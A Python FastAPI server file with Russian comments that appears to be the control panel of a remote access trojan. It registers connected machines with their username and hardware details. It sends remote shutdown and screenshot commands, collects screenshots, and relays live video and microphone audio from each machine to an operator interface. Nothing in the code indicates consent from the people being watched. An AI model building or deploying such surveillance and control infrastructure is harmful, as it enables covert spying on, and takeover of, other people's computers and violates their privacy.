import asyncio
import socket
import sqlite3
import json
import os
import base64
from datetime import datetime

from fastapi import FastAPI, HTTPException, WebSocket, WebSocketDisconnect
from fastapi.responses import JSONResponse, StreamingResponse
import uvicorn
import base64
from PIL import ImageGrab
import io
import json
import socket

app = FastAPI()

HOST = '0.0.0.0'
TCP_PORT = 9999
HTTP_PORT = 8080
DB_FILE = 'clients.db'

# TCP-соединения клиентов
connected_sockets: dict[int, socket.socket] = {}

# Последние видеокадры и аудиофреймы
latest_frames: dict[int, bytes] = {}
latest_audio: dict[int, bytes] = {}

# Подписчики на аудио (GUI)
connected_audio_consumers: dict[int, list[WebSocket]] = {}


def init_db():
    if not os.path.exists(DB_FILE):
        print("[DB] Создаю новую БД")
    conn = sqlite3.connect(DB_FILE)
    conn.execute("""
    CREATE TABLE IF NOT EXISTS clients (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT, username TEXT, os TEXT, arch TEXT,
        cpu TEXT, gpu TEXT,
        cpu_cores INTEGER, cpu_freq REAL,
        ram_total REAL, ram_used REAL, ram_available REAL, ram_percent REAL,
        disks TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    """)
    conn.commit()
    conn.close()
    print("[DB] Готово")


def insert_client(data: dict, ip: str) -> int:
    conn = sqlite3.connect(DB_FILE)
    cur = conn.cursor()
    cur.execute("SELECT id FROM clients WHERE ip=? AND username=?", (ip, data["username"]))
    row = cur.fetchone()
    if row:
        client_id = row[0]
        cur.execute("""
            UPDATE clients SET
                os=?, arch=?, cpu=?, gpu=?,
                cpu_cores=?, cpu_freq=?,
                ram_total=?, ram_used=?, ram_available=?, ram_percent=?,
                disks=?, created_at=CURRENT_TIMESTAMP
            WHERE id=?
        """, (
            data["os"], data["arch"], data["cpu"], data.get("gpu","N/A"),
            data["cpu_cores"], data["cpu_freq"],
            data["ram_total"], data["ram_used"], data["ram_available"], data["ram_percent"],
            json.dumps(data["disks"]), client_id
        ))
    else:
        cur.execute("""
            INSERT INTO clients (
                ip, username, os, arch, cpu, gpu,
                cpu_cores, cpu_freq,
                ram_total, ram_used, ram_available, ram_percent,
                disks
            ) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)
        """, (
            ip, data["username"], data["os"], data["arch"], data["cpu"], data.get("gpu","N/A"),
            data["cpu_cores"], data["cpu_freq"],
            data["ram_total"], data["ram_used"], data["ram_available"], data["ram_percent"],
            json.dumps(data["disks"])
        ))
        client_id = cur.lastrowid
    conn.commit()
    conn.close()
    return client_id





async def tcp_server():
    srv = socket.socket()
    srv.bind((HOST, TCP_PORT))
    srv.listen()
    print(f"[TCP] слушаю {HOST}:{TCP_PORT}")
    while True:
        sock, addr = await asyncio.to_thread(srv.accept)
        asyncio.create_task(handle_client(sock, addr))


@app.on_event("startup")
async def startup():
    init_db()
    asyncio.create_task(tcp_server())


@app.get("/clients")
def clients_list():
    conn = sqlite3.connect(DB_FILE)
    cur = conn.cursor()
    cur.execute("SELECT * FROM clients ORDER BY created_at DESC")
    rows = cur.fetchall()
    cols = [d[0] for d in cur.description]
    conn.close()

    out = []
    for r in rows:
        d = dict(zip(cols, r))
        d["online"] = (d["id"] in connected_sockets)
        out.append(d)
    return JSONResponse(out)


@app.post("/shutdownupravlenie")
def shutdown_control(payload: dict):
    cid = payload.get("id")
    sock = connected_sockets.get(cid)
    if not sock:
        raise HTTPException(404, "client not connected")
    try:
        sock.sendall(json.dumps({"command":"shutdown"}).encode())
        return {"status":"sent"}
    except Exception as e:
        raise HTTPException(500, str(e))





@app.post("/screenshotupravlenie")
def screenshot_control(payload: dict):
    cid = payload.get("id")
    sock = connected_sockets.get(cid)
    if not sock:
        raise HTTPException(404, "client not connected")
    try:
        sock.sendall(json.dumps({"command":"screenshot_request"}).encode())

        print(f"INFO: Команда скриншота отправлена клиенту {cid}")
        return {"status": "sent"}
    except Exception as e:
        raise HTTPException(500, str(e))

async def handle_client(sock: socket.socket, addr):
    ip = addr[0]
    client_id = None
    try:
        # Первичная регистрация клиента
        raw = await asyncio.to_thread(sock.recv, 4096)
        info = json.loads(raw.decode('utf-8'))
        client_id = insert_client(info, ip)
        connected_sockets[client_id] = sock
        await asyncio.to_thread(sock.sendall, b"OK")

        # Приём NDJSON для скриншота
        screenshot_data = b""
        buffer = b""
        while True:
            data = await asyncio.to_thread(sock.recv, 4096)
            if not data:
                break
            buffer += data
            # пока есть полные строки
            while b"\n" in buffer:
                line, buffer = buffer.split(b"\n", 1)
                if not line.strip():
                    continue
                try:
                    command = json.loads(line.decode('utf-8'))
                except json.JSONDecodeError as e:
                    print(f"ERROR: невалидный JSON: {e}")
                    continue

                if command.get("command") == "screenshot":
                    # декодируем Base64 и собираем чанк
                    chunk_bytes = base64.b64decode(command["data"])
                    screenshot_data += chunk_bytes
                    print(f"INFO: Получена часть {command['chunk']+1}/{command['total_chunks']}")

                    # когда получили все части
                    if len(screenshot_data) >= command["total_chunks"] * len(chunk_bytes):
                        fn = f"screenshot_client_{client_id}_{datetime.now():%Y%m%d_%H%M%S}.png"
                        with open(fn, "wb") as f:
                            f.write(screenshot_data)
                        print(f"INFO: Скриншот сохранён как {fn}")

                        # ответ клиенту
                        resp = json.dumps({"command":"screenshot","status":"ok"}) + "\n"
                        await asyncio.to_thread(sock.sendall, resp.encode('utf-8'))
                        screenshot_data = b""
    except Exception as e:
        print(f"ERROR: {e}")
    finally:
        if client_id in connected_sockets:
            connected_sockets.pop(client_id)
        sock.close()







@app.websocket("/ws/screenshot/{client_id}")
async def ws_screenshot(websocket: WebSocket, client_id: int):
    await websocket.accept()
    try:
        while True:
            # Ожидаем команду для отправки скриншота
            await websocket.receive_text()
            print(f"INFO: Команда для скриншота получена для клиента {client_id}")

            # Получаем последний скриншот
            screenshot = latest_frames.get(client_id)
            if screenshot:
                screenshot_size = len(screenshot)  # Размер в байтах
                print(f"INFO: Получен скриншот для клиента {client_id}, размер: {screenshot_size} байт")

                # Сохраняем скриншот на сервере
                screenshot_filename = f"screenshot_client_{client_id}_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
                with open(screenshot_filename, "wb") as f:
                    f.write(screenshot)
                    print(f"INFO: Скриншот сохранён как {screenshot_filename}")

                # Отправляем скриншот клиенту
                await websocket.send_bytes(screenshot)
            else:
                print(f"INFO: Скриншот не найден для клиента {client_id}")

            await asyncio.sleep(0.5)  # Интервал перед следующей отправкой
    except WebSocketDisconnect:
        pass






# WebSocket для приёма видео
@app.websocket("/ws/video/{client_id}")
async def ws_video(websocket: WebSocket, client_id: int):
    await websocket.accept()
    try:
        while True:
            b64 = await websocket.receive_text()
            latest_frames[client_id] = base64.b64decode(b64)
    except WebSocketDisconnect:
        latest_frames.pop(client_id, None)


# MJPEG-стрим видео для GUI
@app.get("/video/mjpeg/{client_id}")
async def mjpeg(client_id: int):
    async def gen():
        while True:
            frame = latest_frames.get(client_id)
            if frame:
                yield (
                    b"--frame\r\n"
                    b"Content-Type: image/jpeg\r\n\r\n" +
                    frame +
                    b"\r\n"
                )
            await asyncio.sleep(0.05)
    return StreamingResponse(gen(),
        media_type="multipart/x-mixed-replace; boundary=frame"
    )


# WebSocket для приёма аудио от клиента
@app.websocket("/ws/audio/{client_id}")
async def ws_audio_produce(websocket: WebSocket, client_id: int):
    await websocket.accept()
    try:
        while True:
            chunk = await websocket.receive_bytes()
            latest_audio[client_id] = chunk
            # ретранслируем всем подписчикам
            for consumer in connected_audio_consumers.get(client_id, []):
                await consumer.send_bytes(chunk)
    except WebSocketDisconnect:
        pass


# WebSocket для подписки GUI на аудио клиента
@app.websocket("/ws/audio/consume/{client_id}")
async def ws_audio_consume(websocket: WebSocket, client_id: int):
    await websocket.accept()
    consumers = connected_audio_consumers.setdefault(client_id, [])
    consumers.append(websocket)
    try:
        while True:
            await asyncio.sleep(3600)
    except WebSocketDisconnect:
        consumers.remove(websocket)


if __name__ == "__main__":
    uvicorn.run("server:app", host=HOST, port=HTTP_PORT, reload=True)